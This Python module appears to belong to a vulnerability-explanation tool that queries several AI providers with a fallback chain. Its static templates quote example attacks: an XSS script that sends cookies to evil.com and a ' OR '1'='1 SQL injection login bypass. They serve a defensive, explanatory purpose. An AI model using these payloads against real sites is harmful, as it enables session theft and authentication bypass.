"""
CodeShield AI — Multi-Model AI Engine
Provides a unified interface to multiple AI providers with automatic fallback.

Priority chain:
  1. OpenAI GPT-4o        (requires OPENAI_API_KEY)
  2. Anthropic Claude     (requires ANTHROPIC_API_KEY)
  3. Google Gemini        (uses VIBEGUARD_AI_API_KEY)
  4. Static templates     (always works — zero dependencies)
"""

import os
import time
import json
import logging
import hashlib
from typing import Optional, Dict, Any, Tuple
from enum import Enum

import httpx

logger = logging.getLogger("codeshield.ai")

# ─── Configuration ────────────────────────────────────────────────────────────

OPENAI_API_KEY       = os.getenv("OPENAI_API_KEY", "")
ANTHROPIC_API_KEY    = os.getenv("ANTHROPIC_API_KEY", "")
GEMINI_API_KEY       = os.getenv("VIBEGUARD_AI_API_KEY", "")
OPENAI_MODEL         = os.getenv("OPENAI_MODEL", "gpt-4o-mini")
ANTHROPIC_MODEL      = os.getenv("ANTHROPIC_MODEL", "claude-3-haiku-20240307")
GEMINI_MODEL         = os.getenv("VIBEGUARD_AI_MODEL", "gemini-2.0-flash")
GEMINI_ENDPOINT      = os.getenv(
    "VIBEGUARD_AI_ENDPOINT",
    "https://generativelanguage.googleapis.com/v1beta/openai/chat/completions"
)
REQUEST_TIMEOUT      = float(os.getenv("AI_TIMEOUT_SECONDS", "20"))

# ─── Prompt Templates ─────────────────────────────────────────────────────────

PROMPTS: Dict[str, str] = {
    "explain": """You are a senior application security engineer. Explain the following security vulnerability clearly and concisely.

Vulnerability:
  Type: {rule_name}
  Severity: {severity}
  File: {file}
  Line: {line}
  Code Snippet:
{snippet}
  CWE: {cwe_id}
  OWASP: {owasp_category}

Provide a JSON response with exactly these keys:
{{
  "why_dangerous": "2-3 sentences explaining why this vulnerability is dangerous",
  "attack_scenario": "A concrete, realistic attack scenario (3-5 sentences)",
  "best_practices": ["practice 1", "practice 2", "practice 3"],
  "severity_rationale": "Why this specific severity was assigned",
  "references": ["CWE link or OWASP link"]
}}""",

    "fix": """You are a senior secure-code engineer. Generate a secure fix for this vulnerability.

Vulnerability:
  Type: {rule_name}
  Severity: {severity}
  File: {file}
  Line: {line}
  Original Code:
{snippet}
  Remediation hint: {remediation}

Provide a JSON response with exactly these keys:
{{
  "fixed_code": "The complete, corrected code replacing the vulnerable snippet",
  "explanation": "1-2 sentences explaining what was changed and why it's now secure",
  "breaking_changes": "List any API or behavior changes (or 'None')",
  "security_improvement": "What specific attack is now prevented"
}}""",

    "attack_scenario": """You are a penetration tester. Describe a realistic attack for this vulnerability.

Type: {rule_name}
Code: {snippet}
CWE: {cwe_id}

Write a concrete attack scenario in 3-5 sentences that a security team could use to understand the real-world impact.""",
}

# ─── Static Fallback Templates ────────────────────────────────────────────────

STATIC_EXPLAIN: Dict[str, Dict[str, Any]] = {
    "SQL Injection": {
        "why_dangerous": "SQL Injection allows attackers to manipulate database queries by injecting malicious SQL code. This can lead to unauthorized data access, data modification, or even complete database takeover.",
        "attack_scenario": "An attacker enters ' OR '1'='1 into a login form. The unsanitized input gets concatenated into the SQL query, bypassing authentication entirely and granting admin access without valid credentials.",
        "best_practices": ["Use parameterized queries or prepared statements", "Apply input validation and sanitization", "Use an ORM like SQLAlchemy or Hibernate", "Apply least-privilege database accounts"],
        "severity_rationale": "Rated HIGH/CRITICAL because direct database access can expose all stored data.",
        "references": ["https://cwe.mitre.org/data/definitions/89.html", "https://owasp.org/www-community/attacks/SQL_Injection"]
    },
    "Hardcoded Secret": {
        "why_dangerous": "Hardcoded secrets (API keys, passwords, tokens) are visible to anyone with code access. Once committed to version control, they persist in history even if removed later.",
        "attack_scenario": "An attacker finds your public GitHub repository, searches for hardcoded API keys, and uses them to make authenticated API calls, incurring charges or accessing sensitive data on your behalf.",
        "best_practices": ["Store secrets in environment variables", "Use a secrets manager (Vault, AWS Secrets Manager)", "Add .env to .gitignore", "Rotate compromised secrets immediately"],
        "severity_rationale": "Rated HIGH because credential exposure directly enables unauthorized system access.",
        "references": ["https://cwe.mitre.org/data/definitions/798.html", "https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure"]
    },
    "XSS": {
        "why_dangerous": "Cross-Site Scripting allows attackers to inject malicious scripts into web pages viewed by other users. This can steal session cookies, redirect users, or perform actions on their behalf.",
        "attack_scenario": "An attacker posts a comment containing <script>document.location='https://evil.com?c='+document.cookie</script>. When other users view the comment, their session cookies are sent to the attacker's server.",
        "best_practices": ["Escape all user-controlled output", "Use Content Security Policy (CSP) headers", "Use frameworks that auto-escape (React, Angular)", "Validate and sanitize all inputs"],
        "severity_rationale": "Rated HIGH because it directly attacks end users and can lead to account takeover.",
        "references": ["https://cwe.mitre.org/data/definitions/79.html", "https://owasp.org/www-community/attacks/xss/"]
    },
}

def _get_static_explain(rule_name: str) -> Dict[str, Any]:
    """Return a static explanation based on vulnerability type."""
    for key, val in STATIC_EXPLAIN.items():
        if key.lower() in rule_name.lower():
            return val
    return {
        "why_dangerous": f"This {rule_name} vulnerability can be exploited by attackers to compromise application security. Always apply secure coding practices and keep dependencies updated.",
        "attack_scenario": "An attacker identifies this vulnerability through automated scanning or manual testing and exploits it to gain unauthorized access or execute malicious actions.",
        "best_practices": ["Follow OWASP Secure Coding Guidelines", "Perform regular security code reviews", "Use SAST tools in your CI/CD pipeline", "Keep all dependencies up to date"],
        "severity_rationale": "Severity assigned based on potential impact and exploitability.",
        "references": ["https://owasp.org/www-project-top-ten/", "https://cwe.mitre.org/"]
    }

def _get_static_fix(rule_name: str, snippet: str) -> Dict[str, Any]:
    """Return a static fix suggestion based on vulnerability type."""
    return {
        "fixed_code": f"# TODO: Apply secure fix for {rule_name}\n# Original code:\n# {snippet.strip()[:200]}\n# Apply the remediation pattern recommended in the security finding.",
        "explanation": f"Replace the vulnerable {rule_name} pattern with a secure alternative as described in the remediation guidance.",
        "breaking_changes": "Review for API compatibility before applying.",
        "security_improvement": f"Eliminates {rule_name} attack vector by applying secure coding patterns."
    }

# ─── Prompt Builder ───────────────────────────────────────────────────────────

def _build_prompt(template_key: str, vuln: Dict[str, Any]) -> str:
    """Build a formatted prompt from a vulnerability dict."""
    template = PROMPTS.get(template_key, "")
    return template.format(
        rule_name=vuln.get("rule_name", "Unknown"),
        severity=vuln.get("severity", "UNKNOWN"),
        file=vuln.get("location", {}).get("file", "unknown"),
        line=vuln.get("location", {}).get("line", 0),
        snippet=vuln.get("location", {}).get("snippet", "(no snippet)"),
        cwe_id=vuln.get("cwe_id", "N/A"),
        owasp_category=vuln.get("owasp_category", "N/A"),
        remediation=vuln.get("remediation", "Apply secure coding practices"),
    )

# ─── Model Callers ─────────────────────────────────────────────────────────────

def _call_openai(prompt: str) -> Optional[str]:
    """Call OpenAI GPT model."""
    if not OPENAI_API_KEY:
        return None
    try:
        with httpx.Client(timeout=REQUEST_TIMEOUT) as client:
            resp = client.post(
                "https://api.openai.com/v1/chat/completions",
                headers={"Authorization": f"Bearer {OPENAI_API_KEY}", "Content-Type": "application/json"},
                json={"model": OPENAI_MODEL, "messages": [{"role": "user", "content": prompt}], "temperature": 0.2},
            )
            if resp.status_code == 200:
                return resp.json()["choices"][0]["message"]["content"]
            logger.warning("OpenAI returned %d", resp.status_code)
    except Exception as e:
        logger.warning("OpenAI call failed: %s", e)
    return None


def _call_anthropic(prompt: str) -> Optional[str]:
    """Call Anthropic Claude model."""
    if not ANTHROPIC_API_KEY:
        return None
    try:
        with httpx.Client(timeout=REQUEST_TIMEOUT) as client:
            resp = client.post(
                "https://api.anthropic.com/v1/messages",
                headers={
                    "x-api-key": ANTHROPIC_API_KEY,
                    "anthropic-version": "2023-06-01",
                    "Content-Type": "application/json",
                },
                json={"model": ANTHROPIC_MODEL, "max_tokens": 1024, "messages": [{"role": "user", "content": prompt}]},
            )
            if resp.status_code == 200:
                return resp.json()["content"][0]["text"]
            logger.warning("Anthropic returned %d", resp.status_code)
    except Exception as e:
        logger.warning("Anthropic call failed: %s", e)
    return None


def _call_gemini(prompt: str) -> Optional[str]:
    """Call Google Gemini via OpenAI-compatible endpoint."""
    if not GEMINI_API_KEY:
        return None
    try:
        with httpx.Client(timeout=REQUEST_TIMEOUT) as client:
            resp = client.post(
                GEMINI_ENDPOINT,
                headers={"Authorization": f"Bearer {GEMINI_API_KEY}", "Content-Type": "application/json"},
                json={"model": GEMINI_MODEL, "messages": [{"role": "user", "content": prompt}], "temperature": 0.2},
            )
            if resp.status_code == 200:
                return resp.json()["choices"][0]["message"]["content"]
            logger.warning("Gemini returned %d: %s", resp.status_code, resp.text[:200])
    except Exception as e:
        logger.warning("Gemini call failed: %s", e)
    return None

# ─── Response Parser ──────────────────────────────────────────────────────────

def _parse_json_response(raw: str) -> Optional[Dict[str, Any]]:
    """Extract and parse a JSON block from an AI response."""
    if not raw:
        return None
    # Strip markdown fences if present
    raw = raw.strip()
    if raw.startswith("```"):
        lines = raw.split("\n")
        raw = "\n".join(lines[1:-1]) if len(lines) > 2 else raw
    try:
        return json.loads(raw)
    except json.JSONDecodeError:
        # Try to find JSON object within the text
        start = raw.find("{")
        end = raw.rfind("}") + 1
        if start != -1 and end > start:
            try:
                return json.loads(raw[start:end])
            except json.JSONDecodeError:
                pass
    return None

# ─── Simple In-Memory Cache ───────────────────────────────────────────────────

_cache: Dict[str, Tuple[Any, float]] = {}
CACHE_TTL = 3600  # 1 hour

def _cache_key(template: str, vuln: Dict[str, Any]) -> str:
    raw = f"{template}:{vuln.get('rule_id','')}:{vuln.get('location',{}).get('snippet','')[:100]}"
    return hashlib.md5(raw.encode()).hexdigest()

def _get_cached(key: str) -> Optional[Any]:
    if key in _cache:
        val, ts = _cache[key]
        if time.time() - ts < CACHE_TTL:
            return val
        del _cache[key]
    return None

def _set_cache(key: str, val: Any) -> None:
    _cache[key] = (val, time.time())

# ─── Public AI Engine Interface ───────────────────────────────────────────────

class AIModelUsed(str, Enum):
    OPENAI    = "openai"
    ANTHROPIC = "anthropic"
    GEMINI    = "gemini"
    STATIC    = "static"


def get_model_status() -> Dict[str, Any]:
    """Return which AI models are currently configured."""
    return {
        "openai":    bool(OPENAI_API_KEY),
        "anthropic": bool(ANTHROPIC_API_KEY),
        "gemini":    bool(GEMINI_API_KEY),
        "active_model": (
            AIModelUsed.OPENAI if OPENAI_API_KEY else
            AIModelUsed.ANTHROPIC if ANTHROPIC_API_KEY else
            AIModelUsed.GEMINI if GEMINI_API_KEY else
            AIModelUsed.STATIC
        ),
    }


def _call_with_fallback(prompt: str) -> Tuple[Optional[str], AIModelUsed]:
    """Try each AI model in priority order, returning the first success."""
    if OPENAI_API_KEY:
        result = _call_openai(prompt)
        if result:
            return result, AIModelUsed.OPENAI
    if ANTHROPIC_API_KEY:
        result = _call_anthropic(prompt)
        if result:
            return result, AIModelUsed.ANTHROPIC
    if GEMINI_API_KEY:
        result = _call_gemini(prompt)
        if result:
            return result, AIModelUsed.GEMINI
    return None, AIModelUsed.STATIC


def explain_vulnerability(vuln: Dict[str, Any]) -> Dict[str, Any]:
    """
    Generate a full AI explanation for a vulnerability.
    Returns a dict with: why_dangerous, attack_scenario, best_practices,
    severity_rationale, references, model_used.
    """
    cache_key = _cache_key("explain", vuln)
    cached = _get_cached(cache_key)
    if cached:
        return cached

    prompt = _build_prompt("explain", vuln)
    raw, model_used = _call_with_fallback(prompt)

    if raw:
        parsed = _parse_json_response(raw)
        if parsed:
            parsed["model_used"] = model_used.value
            _set_cache(cache_key, parsed)
            return parsed

    # Static fallback
    result = _get_static_explain(vuln.get("rule_name", ""))
    result["model_used"] = AIModelUsed.STATIC.value
    _set_cache(cache_key, result)
    return result


def generate_fix(vuln: Dict[str, Any]) -> Dict[str, Any]:
    """
    Generate an AI-powered secure code fix for a vulnerability.
    Returns: fixed_code, explanation, breaking_changes, security_improvement, model_used.
    """
    cache_key = _cache_key("fix", vuln)
    cached = _get_cached(cache_key)
    if cached:
        return cached

    prompt = _build_prompt("fix", vuln)
    raw, model_used = _call_with_fallback(prompt)

    if raw:
        parsed = _parse_json_response(raw)
        if parsed:
            parsed["model_used"] = model_used.value
            _set_cache(cache_key, parsed)
            return parsed

    # Static fallback
    snippet = vuln.get("location", {}).get("snippet", "")
    result = _get_static_fix(vuln.get("rule_name", "Unknown"), snippet)
    result["model_used"] = AIModelUsed.STATIC.value
    _set_cache(cache_key, result)
    return result
